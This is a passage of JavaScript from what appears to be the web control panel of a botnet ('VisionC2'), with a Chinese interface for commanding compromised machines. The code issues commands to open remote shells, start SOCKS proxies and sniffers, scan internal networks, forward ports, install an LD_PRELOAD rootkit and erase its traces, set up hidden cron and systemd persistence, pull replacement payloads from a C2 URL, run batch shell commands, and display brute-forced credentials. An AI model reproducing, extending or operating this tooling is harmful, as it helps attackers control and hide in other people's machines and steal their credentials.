  if (!inputEl || !activeWS || activeWS.readyState !== WebSocket.OPEN) {
    if (outputEl) outputEl.textContent += '[系统消息] 终端未连接，无法下发命令\n';
    return;
  }
  var cmd = inputEl.value;
  if (!cmd) return;
  if (!window._termCmdHistory) window._termCmdHistory = [];
  if (window._termCmdHistory[window._termCmdHistory.length - 1] !== cmd) {
    window._termCmdHistory.push(cmd);
  }
  inputEl.value = '';
  outputEl.textContent += '$ ' + cmd + '\n';
  outputEl.scrollTop = outputEl.scrollHeight;
  activeWS.send(JSON.stringify({ command: cmd }));
}

// ---------------------------------------------------------------------------
// Right-Click Context Menu
// ---------------------------------------------------------------------------
function openContextMenu(e, botID) {
  e.preventDefault();
  currentCtxBotID = botID;
  var menu = document.getElementById('bot-ctx-menu');
  if (!menu) return;

  menu.style.display = 'block';
  menu.style.position = 'fixed';
  menu.style.zIndex = '99999';

  var menuWidth = menu.offsetWidth || 180;
  var menuHeight = menu.offsetHeight || 220;
  var winWidth = window.innerWidth || document.documentElement.clientWidth;
  var winHeight = window.innerHeight || document.documentElement.clientHeight;

  var left = e.clientX;
  var top = e.clientY;

  if (top + menuHeight > winHeight) {
    top = Math.max(10, top - menuHeight);
  }
  if (left + menuWidth > winWidth) {
    left = Math.max(10, left - menuWidth);
  }

  menu.style.left = left + 'px';
  menu.style.top = top + 'px';
}

function showModal(title, bodyHTML, onSubmit) {
  var overlay = document.getElementById('action-modal');
  var titleEl = document.getElementById('modal-title');
  var bodyEl = document.getElementById('modal-body');
  var btn = document.getElementById('modal-submit-btn');

  if (!overlay || !titleEl || !bodyEl || !btn) return;

  titleEl.textContent = title;
  bodyEl.innerHTML = bodyHTML;
  overlay.style.display = 'flex';

  btn.onclick = function () {
    if (onSubmit()) {
      closeModal();
    }
  };
}

function closeModal() {
  var overlay = document.getElementById('action-modal');
  if (overlay) overlay.style.display = 'none';
}

function ctxAction(act) {
  document.getElementById('bot-ctx-menu').style.display = 'none';
  if (!currentCtxBotID) return;

  if (act === 'pty') {
    openShell(currentCtxBotID);
  } else if (act === 'socks') {
    popupCmd(currentCtxBotID, '!socks 1080');
  } else if (act === 'sniffer') {
    popupCmd(currentCtxBotID, '!sniffer start');
  } else if (act === 'portscan') {
    showModal('🔍 内网端口扫描配置 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">扫描目标 IP 或 CIDR 网段:</label>' +
      '<input type="text" id="m-ps-target" value="192.168.1.0/24" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">目标 TCP 端口列表 (逗号分隔):</label>' +
      '<input type="text" id="m-ps-ports" value="22,80,443,3389,8080" class="cmd-input-field" style="width:100%">',
      function () {
        var t = document.getElementById('m-ps-target').value.trim();
        var p = document.getElementById('m-ps-ports').value.trim();
        if (!t || !p) { showToast('请填写完整的目标和端口', 'error'); return false; }
        popupCmd(currentCtxBotID, '!portscan ' + t + ' ' + p + ' 1000');
        return true;
      }
    );
  } else if (act === 'portfwd') {
    showModal('⚡ 创建 TCP 端口转发 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">受控端本地监听端口 (Local Port):</label>' +
      '<input type="number" id="m-pf-lport" placeholder="例如 8080" value="8080" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">转发目标主机 IP (Remote Host):</label>' +
      '<input type="text" id="m-pf-rhost" placeholder="例如 127.0.0.1 或 192.168.1.100" value="127.0.0.1" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">转发目标端口 (Remote Port):</label>' +
      '<input type="number" id="m-pf-rport" placeholder="例如 80" value="80" class="cmd-input-field" style="width:100%">',
      function () {
        var lp = document.getElementById('m-pf-lport').value.trim();
        var rh = document.getElementById('m-pf-rhost').value.trim();
        var rp = document.getElementById('m-pf-rport').value.trim();
        if (!lp || !rh || !rp) { showToast('请完整填写所有端口和IP字段', 'error'); return false; }
        popupCmd(currentCtxBotID, '!portfwd ' + lp + ' ' + rh + ' ' + rp);
        return true;
      }
    );
  } else if (act === 'rootkit') {
    showModal('🛡️ Rootkit 模块管理 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:8px">请选择对受控端执行的 Rootkit 操作:</label>' +
      '<select id="m-rk-action" class="cmd-select" style="width:100%">' +
      '<option value="!rootkit status">检查 Rootkit 运行状态</option>' +
      '<option value="!rootkit install">编译并安装 LD_PRELOAD Rootkit</option>' +
      '<option value="!rootkit remove">卸载并清除 Rootkit 痕迹</option>' +
      '</select>',
      function () {
        var cmd = document.getElementById('m-rk-action').value;
        popupCmd(currentCtxBotID, cmd);
        return true;
      }
    );
  } else if (act === 'persist') {
    showModal('📌 安装深度持久化驻留 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">备用 Payload 下载 URL (可选):</label>' +
      '<input type="text" id="m-pe-url" placeholder="留空默认直接复制当前运行的 Bot 二进制文件" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<div style="font-size:11px;color:var(--text-dim);line-height:1.5">说明: 将在受控端创建隐藏目录、复制二进制，并安装看门狗 Cron 及 systemd 自动重启服务。</div>',
      function () {
        var u = document.getElementById('m-pe-url').value.trim();
        var cmd = '!persist' + (u ? (' ' + u) : '');
        popupCmd(currentCtxBotID, cmd);
        return true;
      }
    );
  } else if (act === 'update') {
    showModal('🔄 远程更新受控端 (' + currentCtxBotID + ')',
      '<label style="display:block;font-size:12px;color:#888;margin-bottom:4px">新版 Bot 二进制或 Loader 下载 URL:</label>' +
      '<input type="text" id="m-up-url" placeholder="例如 http://your-c2-ip/bins/kworker_u8 或 loader.sh" class="cmd-input-field" style="width:100%;margin-bottom:12px">' +
      '<div style="font-size:11px;color:var(--text-dim);line-height:1.5">说明: 受控端将通过网络下载最新 Payload，保存在临时目录后使用 syscall.Exec 替换当前进程。</div>',
      function () {
        var u = document.getElementById('m-up-url').value.trim();
        if (!u) { showToast('请填写有效的新 Payload 下载 URL', 'error'); return false; }
        popupCmd(currentCtxBotID, '!reinstall ' + u);
        return true;
      }
    );
  } else if (act === 'kill') {
    if (confirm('确定销毁受控端 ' + currentCtxBotID + '？此操作不可逆！')) popupCmd(currentCtxBotID, '!kill');
  }
}

document.addEventListener('click', function (e) {
  var menu = document.getElementById('bot-ctx-menu');
  if (menu && !menu.contains(e.target)) {
    menu.style.display = 'none';
  }
});

// ---------------------------------------------------------------------------
// Cyberpunk Tactical SVG Radar Map Engine (100% Local, Zero External CDN)
// ---------------------------------------------------------------------------
var activeRadarTooltip = null;

function getBotCoords(b) {
  var cc = (b.country || 'US').toUpperCase();
  var base = countryCoords[cc] || [37.0902, -95.7129];
  // Deterministic pseudorandom hash based on botID string (never randomly jumps on polling)
  var id = b.botID || '';
  var hash = 0;
  for (var i = 0; i < id.length; i++) {
    hash = ((hash << 5) - hash) + id.charCodeAt(i);
    hash |= 0;
  }
  var norm1 = ((Math.abs(hash) % 100) / 100) - 0.5;
  var norm2 = (((Math.abs(hash >> 7)) % 100) / 100) - 0.5;
  var jitterLng = norm1 * 5.0;
  var jitterLat = norm2 * 3.5;
  var lng = base[1] + jitterLng;
  var lat = base[0] + jitterLat;
  var x = ((lng + 180) / 360) * 1000;
  var y = ((90 - lat) / 180) * 500;
  return {
    x: Math.round(Math.max(25, Math.min(975, x))),
    y: Math.round(Math.max(25, Math.min(475, y)))
  };
}

function renderCyberRadar(containerId, bots, isFull) {
  var container = document.getElementById(containerId);
  if (!container) return;

  var botCount = bots ? bots.length : 0;
  var svgHeight = isFull ? '100%' : '100%';

  // SVG stylized continent vector paths calibrated to Equirectangular 1000x500 projection
  var continentPaths = [
    // North America (Alaska, Canada, US, Mexico, Greenland)
    'M 35,70 L 65,55 L 115,45 L 175,40 L 220,55 L 295,50 L 325,75 L 295,110 L 260,115 L 285,150 L 270,195 L 230,210 L 195,255 L 210,270 L 180,290 L 160,250 L 130,200 L 105,145 L 65,120 L 35,90 Z',
    'M 360,35 L 430,30 L 450,75 L 390,95 L 350,60 Z', // Greenland
    'M 195,255 L 235,275 L 255,295 L 240,305 L 205,280 Z', // Central America
    // South America
    'M 265,300 L 320,290 L 380,310 L 420,340 L 390,390 L 360,450 L 330,475 L 310,430 L 295,360 L 270,320 Z',
    // Europe
    'M 468,95 L 492,88 L 496,115 L 480,125 Z', // UK
    'M 458,104 L 472,98 L 468,120 Z', // Ireland
    'M 525,50 L 565,45 L 585,80 L 555,100 L 535,90 Z', // Scandinavia
    'M 480,130 L 530,115 L 575,120 L 580,150 L 540,165 L 515,165 L 485,155 Z', // Western / Central Europe
    'M 465,150 L 505,145 L 500,175 L 465,175 Z', // Iberia
    'M 535,150 L 555,160 L 550,185 L 540,180 Z', // Italy
    // Africa
    'M 475,190 L 540,180 L 610,195 L 635,245 L 610,290 L 585,360 L 550,400 L 525,380 L 510,300 L 460,250 L 465,210 Z',
    'M 625,335 L 640,330 L 635,370 L 620,365 Z', // Madagascar
    // Asia
    'M 580,55 L 680,45 L 820,40 L 920,55 L 940,90 L 890,110 L 810,100 L 730,115 L 650,90 L 585,85 Z', // Siberia / Northern Eurasia
    'M 590,190 L 650,185 L 675,225 L 635,255 L 595,240 Z', // Middle East
    'M 685,190 L 730,195 L 755,230 L 725,275 L 695,235 Z', // India
    'M 735,125 L 815,110 L 865,140 L 850,205 L 800,230 L 750,210 L 725,165 Z', // China & East Asia
    'M 885,130 L 905,140 L 895,175 L 875,165 Z', // Japan
    'M 845,145 L 860,150 L 855,175 L 845,170 Z', // Korea
    'M 780,225 L 825,220 L 820,265 L 790,260 Z', // Southeast Asia
    'M 785,275 L 830,270 L 880,285 L 870,305 L 810,305 Z', // Indonesia
    'M 840,240 L 865,245 L 855,270 Z', // Philippines
    // Australia & Oceania
    'M 825,320 L 890,305 L 925,335 L 905,385 L 845,385 L 815,350 Z', // Australia
    'M 955,390 L 970,395 L 955,435 L 945,420 Z' // New Zealand
  ];

  var html = '<div class="cyber-radar-wrap" id="' + containerId + '-radar-wrap">';

  // Tactical HUD Top Bar
  html += '<div class="radar-hud-bar">' +
    '<div class="radar-hud-tag">' +
    '<span style="display:inline-block;width:7px;height:7px;border-radius:50%;background:#00ff66;box-shadow:0 0 6px #00ff66"></span> ' +
    '<span>RADAR SWEEP: 2.4 GHz [ACTIVE]</span>' +
    '</div>' +
    '<div class="radar-hud-tag" id="' + containerId + '-coord-tag">' +
    '<span>GRID: WGS-84 / EQUIR</span>' +
    '</div>' +
    '<div class="radar-hud-tag">' +
    '<span style="color:var(--accent);font-weight:700">ONLINE: ' + botCount + ' NODES</span>' +
    '</div>' +
    '</div>';

  // Core Vector SVG
  html += '<svg viewBox="0 0 1000 500" preserveAspectRatio="xMidYMid slice" style="width:100%;height:' + svgHeight + ';display:block" onmousemove="updateRadarCoords(event, \'' + containerId + '\')">';

  // Definitions for Filters & Gradients
  html += '<defs>' +
    '<filter id="glow-green" x="-30%" y="-30%" width="160%" height="160%">' +
    '<feGaussianBlur stdDeviation="3" result="blur"/>' +
    '<feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>' +
    '</filter>' +
    '<radialGradient id="radar-center-glow" cx="50%" cy="50%" r="50%">' +
    '<stop offset="0%" stop-color="rgba(0, 255, 102, 0.08)"/>' +
    '<stop offset="100%" stop-color="transparent"/>' +
    '</radialGradient>' +
    '<linearGradient id="sweep-beam-grad" x1="0%" y1="0%" x2="100%" y2="100%">' +
    '<stop offset="0%" stop-color="rgba(0, 255, 102, 0.35)"/>' +
    '<stop offset="50%" stop-color="rgba(0, 255, 102, 0.06)"/>' +
    '<stop offset="100%" stop-color="transparent"/>' +
    '</linearGradient>' +
    '</defs>';

  // Center Radar Radial Glow
  html += '<circle cx="500" cy="250" r="300" fill="url(#radar-center-glow)"/>';

  // Tactical Lat/Lon Grid Lines
  html += '<g class="radar-grid">';
  html += '<line x1="0" y1="125" x2="1000" y2="125" class="radar-grid-line"/>'; // 45° N
  html += '<line x1="0" y1="250" x2="1000" y2="250" class="radar-grid-line" style="stroke:rgba(168,85,247,0.3);stroke-width:1.2"/>'; // Equator
  html += '<line x1="0" y1="375" x2="1000" y2="375" class="radar-grid-line"/>'; // 45° S
  html += '<line x1="250" y1="0" x2="250" y2="500" class="radar-grid-line"/>'; // 90° W
  html += '<line x1="500" y1="0" x2="500" y2="500" class="radar-grid-line" style="stroke:rgba(56,189,248,0.3);stroke-width:1.2"/>'; // Prime Meridian
  html += '<line x1="750" y1="0" x2="750" y2="500" class="radar-grid-line"/>'; // 90° E
  html += '</g>';

  // Concentric Radar Rings
  html += '<g class="radar-rings">';
  html += '<circle cx="500" cy="250" r="100" class="radar-ring"/>';
  html += '<circle cx="500" cy="250" r="200" class="radar-ring"/>';
  html += '<circle cx="500" cy="250" r="320" class="radar-ring" style="stroke-dasharray:6,6"/>';
  html += '<circle cx="500" cy="250" r="450" class="radar-ring"/>';
  html += '</g>';

  // Vector Continents
  html += '<g class="radar-landmasses">';
  continentPaths.forEach(function (p) {
    html += '<path d="' + p + '" class="landmass-path"/>';
  });
  html += '</g>';

  // Rotating Radar Sweep Arm
  html += '<g class="radar-sweep-arm">';
  html += '<path d="M 500,250 L 500,0 A 250,250 0 0,1 625,33 Z" fill="url(#sweep-beam-grad)"/>';
  html += '<line x1="500" y1="250" x2="500" y2="0" stroke="#00ff66" stroke-width="1.8" filter="url(#glow-green)"/>';
  html += '</g>';

  // Render Tactical Nodes
  if (bots && bots.length) {
    html += '<g class="radar-nodes-group">';
    bots.forEach(function (b) {
      var coords = getBotCoords(b);
      var isSocks = b.socksActive || b.socksEnabled;
      var dotColor = isSocks ? '#a855f7' : '#00ff66';
      var pulseColor = isSocks ? 'rgba(168, 85, 247, 0.8)' : 'rgba(0, 255, 102, 0.8)';

      html += '<g class="radar-node-group" onclick="showRadarTooltip(event, \'' + escHtml(b.botID) + '\', \'' + containerId + '\')" onmouseenter="showRadarTooltip(event, \'' + escHtml(b.botID) + '\', \'' + containerId + '\')">';
      // Pulse Ripple Ring
      html += '<circle cx="' + coords.x + '" cy="' + coords.y + '" r="10" fill="none" stroke="' + pulseColor + '" stroke-width="1.2" class="bot-radar-pulse"/>';
      // Center Glow Dot
      html += '<circle cx="' + coords.x + '" cy="' + coords.y + '" r="4.5" fill="' + dotColor + '" filter="url(#glow-green)" class="bot-radar-dot"/>';
      // Tag Label
      html += '<text x="' + (coords.x + 8) + '" y="' + (coords.y + 3) + '" fill="#cbd5e1" font-size="9" font-family="monospace" font-weight="700" style="pointer-events:none;text-shadow:0 1px 3px #000">' + escHtml(b.botID) + '</text>';
      html += '</g>';
    });
    html += '</g>';
  }

  html += '</svg>';

  // Bottom Tactical Coordinates Bar
  html += '<div class="radar-hud-bottom">' +
    '<span>PROJECTION: CYLINDRICAL EQUIRECTANGULAR</span>' +
    '<span>TARGET ACQUISITION: 100% RELIABLE (LOCAL VECTOR)</span>' +
    '</div>';

  html += '</div>';

  container.innerHTML = html;
}

function updateRadarCoords(e, containerId) {
  var tag = document.getElementById(containerId + '-coord-tag');
  if (!tag) return;
  var rect = e.currentTarget.getBoundingClientRect();
  var mouseX = e.clientX - rect.left;
  var mouseY = e.clientY - rect.top;

  var normX = Math.max(0, Math.min(1, mouseX / rect.width));
  var normY = Math.max(0, Math.min(1, mouseY / rect.height));

  var lng = Math.round((normX * 360 - 180) * 10) / 10;
  var lat = Math.round((90 - normY * 180) * 10) / 10;

  var lngStr = (lng >= 0 ? '+' : '') + lng + '°';
  var latStr = (lat >= 0 ? '+' : '') + lat + '°';

  tag.innerHTML = '<span>POS: LAT ' + latStr + ' | LON ' + lngStr + '</span>';
}

function showRadarTooltip(event, botID, containerId) {
  event.stopPropagation();
  hideRadarTooltip();

  var bot = botState[botID] || (window._botsArr ? window._botsArr.find(function(b) { return b.botID === botID; }) : null);
  if (!bot) return;

  var wrap = document.getElementById(containerId + '-radar-wrap');
  if (!wrap) return;

  var tip = document.createElement('div');
  tip.className = 'radar-hud-tooltip';
  tip.id = 'active-radar-tip';

  var capsHtml = '';
  if (bot.caps) {
    if (bot.caps.indexOf('A') !== -1) capsHtml += '<span class="cap-badge">ATK</span> ';
    if (bot.caps.indexOf('S') !== -1) capsHtml += '<span class="cap-badge purple">SOCKS</span> ';
    if (bot.caps.indexOf('N') !== -1) capsHtml += '<span class="cap-badge">SNIFF</span> ';
    if (bot.caps.indexOf('C') !== -1) capsHtml += '<span class="cap-badge purple">SCAN</span> ';
    if (bot.caps.indexOf('R') !== -1) capsHtml += '<span class="cap-badge">RTKT</span> ';
  }

  tip.innerHTML = '<div class="rtt-head">' +
    '<span class="rtt-title">🎯 ' + escHtml(bot.botID) + '</span>' +
    '<span class="cap-badge">' + escHtml(bot.country || 'US') + '</span>' +
    '</div>' +
    '<div class="rtt-row"><span class="rtt-label">IP 地址:</span><span class="rtt-val">' + escHtml(bot.ip) + '</span></div>' +
    '<div class="rtt-row"><span class="rtt-label">系统架构:</span><span class="rtt-val">' + escHtml(bot.arch) + '</span></div>' +
    '<div class="rtt-row"><span class="rtt-label">进程/PID:</span><span class="rtt-val">' + escHtml(bot.processName || '-') + '</span></div>' +
    '<div class="rtt-row"><span class="rtt-label">系统资源:</span><span class="rtt-val">' + bot.ram + 'MB | ' + bot.cpuCores + '核</span></div>' +
    '<div class="rtt-row"><span class="rtt-label">模块能力:</span><span class="rtt-val">' + (capsHtml || '-') + '</span></div>' +
    '<div class="rtt-actions">' +
    '<button class="rtt-btn" onclick="openShell(\'' + escHtml(bot.botID) + '\')">💻 打开 PTY</button>' +
    '<button class="rtt-btn sec" onclick="selectBotInConsole(\'' + escHtml(bot.botID) + '\')">⚡ 选为目标</button>' +
    '</div>';

  wrap.appendChild(tip);

  var wrapRect = wrap.getBoundingClientRect();
  var tipX = event.clientX - wrapRect.left + 15;
  var tipY = event.clientY - wrapRect.top - 20;

  if (tipX + 230 > wrapRect.width) {
    tipX = Math.max(10, event.clientX - wrapRect.left - 240);
  }
  if (tipY + 160 > wrapRect.height) {
    tipY = Math.max(10, wrapRect.height - 180);
  }

  tip.style.left = tipX + 'px';
  tip.style.top = tipY + 'px';

  activeRadarTooltip = tip;
}

function selectBotInConsole(botID) {
  var botInput = document.getElementById('cmd-bot');
  if (botInput) botInput.value = botID;
  switchSection('bots');
  hideRadarTooltip();
  var dock = document.querySelector('.cmd-dock');
  if (dock) dock.scrollIntoView({ behavior: 'smooth' });
}

function hideRadarTooltip() {
  var tip = document.getElementById('active-radar-tip');
  if (tip && tip.parentNode) {
    tip.parentNode.removeChild(tip);
  }
  activeRadarTooltip = null;
}

document.addEventListener('click', function(e) {
  if (activeRadarTooltip && !activeRadarTooltip.contains(e.target)) {
    hideRadarTooltip();
  }
});

function updateGlobalMap(bots) {
  if (!bots) return;
  var countEl = document.getElementById('map-bot-count');
  if (countEl) countEl.textContent = '在线节点: ' + bots.length;

  renderCyberRadar('map-container', bots, false);

  var fullContainer = document.getElementById('full-map-container');
  var secMap = document.getElementById('sec-map');
  if (fullContainer && secMap && secMap.classList.contains('active')) {
    renderCyberRadar('full-map-container', bots, true);
  }
}

function toggleTheme() {
  var cur = document.documentElement.getAttribute('data-theme');
  var next = cur === 'light' ? 'dark' : 'light';
  document.documentElement.setAttribute('data-theme', next);
  showToast(next === 'dark' ? '已切换至深色战术模式' : '已切换至明亮模式', 'info');
}

function renderActivity(entries) {
  if (!entries || !entries.length) return;
  var tbody = document.getElementById('activity-tbody');
  var html = '';
  entries.slice(0, 15).forEach(function (e) {
    html += '<tr>' +
      '<td>' + escHtml(e.timestamp || '刚刚') + '</td>' +
      '<td><span class="cap-badge">' + escHtml(e.type || 'EVENT') + '</span></td>' +
      '<td>' + escHtml(e.message) + '</td>' +
      '</tr>';
  });
  tbody.innerHTML = html;
}

function switchCmdCat(btn) {
  var cat = btn.getAttribute('data-cat');
  document.querySelectorAll('.cmd-cat-pills .cmd-cat-btn').forEach(function (b) { b.classList.remove('active'); });
  btn.classList.add('active');

  var sel = document.getElementById('cmd-type');
  if (!sel) return;
  var firstMatchIndex = -1;
  for (var i = 0; i < sel.options.length; i++) {
    var opt = sel.options[i];
    var optCat = opt.getAttribute('data-cat');
    if (!cat || optCat === cat) {
      opt.style.display = '';
      if (firstMatchIndex === -1) firstMatchIndex = i;
    } else {
      opt.style.display = 'none';
    }
  }

  var optgroups = sel.querySelectorAll('optgroup');
  optgroups.forEach(function (og) {
    var hasVisible = false;
    for (var k = 0; k < og.children.length; k++) {
      if (og.children[k].style.display !== 'none') {
        hasVisible = true;
        break;
      }
    }
    og.style.display = hasVisible ? '' : 'none';
  });

  if (firstMatchIndex !== -1) {
    sel.selectedIndex = firstMatchIndex;
  }
  updateArgFields();
}

function filterBotTable() {
  var q = (document.getElementById('bot-search').value || '').toLowerCase().trim();
  var rows = document.querySelectorAll('#bot-tbody tr');
  var count = 0;
  rows.forEach(function (r) {
    if (r.cells && r.cells.length < 2) return;
    var text = r.textContent.toLowerCase();
    if (!q || text.indexOf(q) !== -1) {
      r.style.display = '';
      count++;
    } else {
      r.style.display = 'none';
    }
  });
  var countEl = document.getElementById('search-count');
  if (countEl) countEl.textContent = q ? ('已筛选出 ' + count + ' 个受控端') : '';
}

// ---------------------------------------------------------------------------
// Batch Actions & Command Helpers
// ---------------------------------------------------------------------------
function onBotCheck(chk, botID) {
  if (chk.checked) {
    selectedBots[botID] = true;
  } else {
    delete selectedBots[botID];
  }
  updateBatchBar();
}

function selectAllBots(master) {
  var chks = document.querySelectorAll('.bot-chk');
  chks.forEach(function (c) {
    c.checked = master.checked;
    var id = c.getAttribute('data-id');
    if (id) {
      if (master.checked) selectedBots[id] = true;
      else delete selectedBots[id];
    }
  });
  updateBatchBar();
}

function updateBatchBar() {
  var bar = document.getElementById('batch-action-bar');
  var countEl = document.getElementById('batch-count');
  var count = Object.keys(selectedBots).length;
  if (!bar) return;
  if (count > 0) {
    bar.style.display = 'flex';
    if (countEl) countEl.textContent = count;
  } else {
    bar.style.display = 'none';
  }
}

function clearSelectedBots() {
  selectedBots = {};
  document.querySelectorAll('.bot-chk').forEach(function (c) { c.checked = false; });
  var master = document.querySelector('thead input[type="checkbox"]');
  if (master) master.checked = false;
  updateBatchBar();
}

function batchExecuteDirect(cmd) {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  if (cmd === '!kill' && !confirm('警告：确定对选中的 ' + ids.length + ' 个受控端下发自毁销毁指令？此操作不可逆！')) return;
  logConsoleMsg('-> [批量下发] 正在向 ' + ids.length + ' 个节点执行: ' + cmd + ' (' + ids.join(', ') + ')', null);
  ids.forEach(function (id) {
    popupCmd(id, cmd);
  });
  clearSelectedBots();
}

function batchCmdPrompt(baseCmd) {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  var cmd = prompt('请输入要批量下发至选中的 ' + ids.length + ' 个受控端的 Shell 命令:', 'whoami');
  if (!cmd) return;
  batchExecuteDirect('!shell ' + cmd.trim());
}

function syncCmdBotSelect(val) {
  var inp = document.getElementById('cmd-bot');
  if (inp) inp.value = val;
}

function fillShellCmd(txt) {
  var sel = document.getElementById('cmd-type');
  if (sel && sel.value !== '!shell') {
    sel.value = '!shell';
    updateArgFields();
  }
  var argInp = document.getElementById('arg-cmd');
  if (argInp) {
    argInp.value = txt;
    argInp.focus();
  }
}

function startScannerCmdWithPayload(cmdName, cidrId, payloadId) {
  var cidr = (document.getElementById(cidrId) || {}).value || '';
  var payload = (document.getElementById(payloadId) || {}).value || '';
  if (!cidr) { showToast('请输入目标 CIDR 网段', 'error'); return; }
  var fullCmd = cmdName + ' ' + cidr.trim() + (payload.trim() ? (' ' + payload.trim()) : '');
  sendBroadCmd(fullCmd);
}

function termQuickCmd(cmd) {
  var inputEl = document.getElementById('term-input');
  if (cmd === 'clear') {
    var outputEl = document.getElementById('term-output');
    if (outputEl) outputEl.textContent = '[VisionC2 PTY 终端已清屏]\n';
    showToast('PTY 终端已清屏', 'info');
    return;
  }
  if (!activeWS || activeWS.readyState !== WebSocket.OPEN) {
    var sel = document.getElementById('term-bot-selector');
    if (sel && sel.value) {
      openShell(sel.value);
      setTimeout(function () {
        var inp = document.getElementById('term-input');
        if (inp) { inp.value = cmd; sendTermInput(); }
      }, 500);
      return;
    }
    showToast('请先选择或连接受控端 PTY 会话', 'error');
    return;
  }
  if (inputEl) {
    inputEl.value = cmd;
    sendTermInput();
  }
}

function stopPortFwdTunnel(botID) {
  popupCmd(botID, '!stopportfwd');
  if (window._activePortFwds) {
    window._activePortFwds = window._activePortFwds.filter(function (pf) { return pf.botID !== botID; });
    if (window._botsArr) updateProxies(window._botsArr);
  }
}

function updateProxies(bots) {
  var tbody = document.getElementById('proxy-tbody');
  var badge = document.getElementById('badge-socks');
  if (!tbody) return;
  var count = 0;
  var html = '';

  // Render SOCKS5 Proxies
  if (bots && bots.length) {
    bots.forEach(function (b) {
      if (b.socksActive) {
        count++;
        html += '<tr>' +
          '<td><span class="cap-badge purple">SOCKS5</span></td>' +
          '<td style="font-weight:700;color:var(--accent)">' + escHtml(b.botID) + '</td>' +
          '<td>' + escHtml(b.socksRelay || '0.0.0.0:1080') + '</td>' +
          '<td style="color:var(--text-dim)">动态全流量代理隧道</td>' +
          '<td style="color:var(--green)">● 运行中</td>' +
          '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="popupCmd(\'' + b.botID + '\', \'!stopsocks\')">停止代理</button></td>' +
          '</tr>';
      }
    });
  }

  // Render Active TCP Port Forwarding Tunnels
  if (window._activePortFwds && window._activePortFwds.length) {
    window._activePortFwds.forEach(function (pf) {
      count++;
      html += '<tr>' +
        '<td><span class="cap-badge" style="background:rgba(56,189,248,0.15);color:var(--blue);border:1px solid rgba(56,189,248,0.3)">TCP转发</span></td>' +
        '<td style="font-weight:700;color:var(--accent)">' + escHtml(pf.botID) + '</td>' +
        '<td>本地监听 :' + escHtml(pf.lport) + '</td>' +
        '<td style="font-family:var(--mono);color:var(--blue);font-weight:600">' + escHtml(pf.rhost) + ':' + escHtml(pf.rport) + '</td>' +
        '<td style="color:var(--green)">● 转发活跃</td>' +
        '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="stopPortFwdTunnel(\'' + pf.botID + '\')">关闭转发</button></td>' +
        '</tr>';
    });
  }

  if (badge) badge.textContent = count;
  if (!html) {
    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--text-dim)">暂无活动的 SOCKS 代理或端口转发隧道</td></tr>';
  } else {
    tbody.innerHTML = html;
  }
}

function loadScanResults() {
  fetch('/api/scan_results').then(function (r) { return r.json(); }).then(renderScanResults).catch(function () {});
}

function renderScanResults(list) {
  var tbody = document.getElementById('scan-results-tbody');
  if (!tbody) return;
  if (!list || !list.length) {
    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:24px;color:var(--text-dim)">暂无实时上报的扫描战报或凭据...</td></tr>';
    return;
  }
  var html = '';
  list.forEach(function (item) {
    var typeBadgeClass = (item.type && item.type.indexOf('爆破') !== -1) ? 'purple' : 'green';
    html += '<tr>' +
      '<td style="color:#888;font-size:11px">' + escHtml(item.timestamp || '刚刚') + '</td>' +
      '<td style="font-weight:700;color:var(--accent)">' + escHtml(item.botID) + '</td>' +
      '<td><span class="cap-badge ' + typeBadgeClass + '">' + escHtml(item.type) + '</span></td>' +
      '<td style="font-family:var(--mono);font-size:12px;font-weight:600">' + escHtml(item.target) + '</td>' +
      '<td style="font-family:var(--mono);color:#00ff66;font-size:12px;word-break:break-all">' + escHtml(item.result) + '</td>' +
      '<td><button class="cmd-cat-btn" style="padding:2px 8px;font-size:11px" onclick="copyText(\'' + escHtml(item.result).replace(/'/g, "\\'") + '\')">复制</button></td>' +
      '</tr>';
  });
  tbody.innerHTML = html;
}

function clearScanResults() {
  if (!confirm('确定清空所有上报的扫描战报与凭据？')) return;
  fetch('/api/scan_results', { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function () {
      showToast('已清空所有扫描与爆破战报', 'info');
      loadScanResults();
    });
}

function copyText(txt, label) {
  var name = label ? (label + ' ') : '';
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(txt).then(function() {
      showToast('已复制 ' + name + '到剪贴板: ' + txt, 'success');
    }).catch(function() {
      fallbackCopy(txt, name);
    });
  } else {
    fallbackCopy(txt, name);
  }
}

function fallbackCopy(txt, name) {
  var input = document.createElement('textarea');
  input.value = txt;
  input.style.position = 'fixed';
  input.style.opacity = '0';
  document.body.appendChild(input);
  input.select();
  try {
    document.execCommand('copy');
    showToast('已复制 ' + (name || '') + '到剪贴板: ' + txt, 'success');
  } catch (e) {
    showToast('复制失败，请手动复制', 'error');
  }
  document.body.removeChild(input);
}

function initSSE() {
  if (typeof EventSource === 'undefined') return;
  try {
    var es = new EventSource('/api/events');
    var dot = document.getElementById('sse-dot');
    var txt = document.getElementById('sse-text');
    es.onopen = function () {
      if (dot) dot.className = 'sse-dot connected';
      if (txt) txt.textContent = '实时通道: 已建立';
    };
    es.onerror = function () {
      if (dot) dot.className = 'sse-dot disconnected';
      if (txt) txt.textContent = '实时通道: 离线';
    };
    es.addEventListener('activity', function () {
      refreshAll();
    });
    es.addEventListener('bot_output', function (evt) {
      try {
        var data = JSON.parse(evt.data);
        if (data && data.output) {
          logConsoleBotOutput(data.botID, data.output, data.timestamp);
        }
      } catch (e) {}
    });
    es.addEventListener('scan_result', function () {
      loadScanResults();
    });
  } catch (e) {}
